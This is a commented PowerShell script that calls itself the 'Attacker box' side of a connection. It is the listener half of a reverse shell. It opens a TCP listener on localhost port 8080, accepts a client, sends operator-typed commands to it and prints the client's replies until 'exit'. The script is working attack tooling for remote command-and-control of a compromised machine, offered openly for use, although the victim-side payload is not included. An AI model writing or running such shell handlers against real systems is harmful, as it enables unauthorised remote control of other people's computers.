#this is a powershell - Client - Attacker box
# Define the IP address and port number to listen on
$ip = "127.0.0.1"
$port = "8080"

# Create a new TCP listener on the specified IP and port
$socket = new-object System.Net.Sockets.TcpListener($ip, $port);

# If the listener is null, exit the script
if($socket -eq $null){
    exit 1
}

# Start the listener
$socket.start()

# Wait for a client to connect
$client = $socket.AcceptTcpClient()

# Output a message to indicate that a connection has been established
write-output "[*] Connection!"

# Get the stream from the client
$stream = $client.GetStream();

# Create a stream writer to write to the stream
$writer = new-object System.IO.StreamWriter($stream);

# Create a buffer to store data received from the client
$buffer = new-object System.Byte[] 2048;

# Create an ASCII encoding object
$encoding = new-object System.Text.AsciiEncoding;

# Loop until the client disconnects
do
{
    # Read a command from the console
    $cmd = read-host

    # Write the command to the stream
    $writer.WriteLine($cmd)
    $writer.Flush();

    # If the command is "exit", break out of the loop
    if($cmd -eq "exit"){
        break
    }

    # Read the response from the client
    $read = $null;
    while($stream.DataAvailable -or $read -eq $null) {
        $read = $stream.Read($buffer, 0, 2048)
        $out = $encoding.GetString($buffer, 0, $read)
        Write-Output $out
    }

# Continue the loop as long as the client is connected
} While ($client.Connected -eq $true)

# Stop the listener
$socket.Stop()

# Close the client and stream
$client.close();
$stream.Dispose()
